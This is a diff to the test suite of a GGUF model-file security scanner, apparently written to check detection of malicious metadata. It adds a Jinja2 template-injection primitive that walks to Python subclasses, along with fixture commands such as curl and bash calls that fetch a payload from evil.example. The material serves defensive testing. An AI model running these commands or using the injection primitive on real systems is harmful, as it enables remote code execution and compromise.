@@ -819,7 +819,25 @@ def test_gguf_scanner_fails_closed_on_oversized_chat_templates(tmp_path: Path) -
         for check in direct.checks
     )
     assert not any(check.name == "Jinja2 SSTI Analysis" for check in direct.checks)
+    assert _failed_metadata_value_checks(direct) == []
     _assert_inconclusive_exit2(aggregate, "jinja2_template_size_limit_exceeded")
+
+
+def test_gguf_oversized_chat_template_with_ssti_primitive_keeps_metadata_evidence(tmp_path: Path) -> None:
+    template = "{{ ''.__class__.__mro__[1].__subclasses__() }}" + ("{{ content }}" * 100)
+    path = create_mock_gguf(
+        tmp_path / "large-malicious-template.gguf",
+        metadata={"tokenizer.chat_template": template},
+    )
+
+    result = GgufScanner(config={"max_template_size": 64}).scan(str(path))
+
+    checks = _failed_metadata_value_checks(result)
+    assert any(
+        check.details["evidence_type"] == "template_injection" and check.details["pattern"] == "jinja2_object_traversal"
+        for check in checks
+    )
+    assert any(check.name == "Template Size Limit" and check.status == CheckStatus.FAILED for check in result.checks)
 
 
 def test_gguf_scanner_propagates_jinja_sandbox_budget_inconclusive(tmp_path: Path) -> None:
@@ -1118,10 +1136,14 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("download", "/usr/bin/wget https://evil.example/payload.sh -O /tmp/payload.sh", "remote_fetch"),
         ("download", "curl -o /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl --output /tmp/payload.sh https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl -X POST https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "curl --request POST https://evil.example/payload.sh", "remote_fetch"),
         ("download", "/usr/bin/curl https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl -H 'Authorization: Bearer token' https://evil.example/payload.sh", "remote_fetch"),
+        ("loader", "/bin/bash -c 'curl https://evil.example/payload.sh'", "command_execution"),
         ("callback", "requests.get('https://evil.example/payload')", "remote_fetch"),
         ("callback", 'requests.get(url="https://evil.example/payload")', "remote_fetch"),
+        ("callback", 'url = "https://evil.example/payload"; requests.get(url)', "remote_fetch"),
     ],
 )
 def test_gguf_metadata_value_requires_concrete_security_evidence(
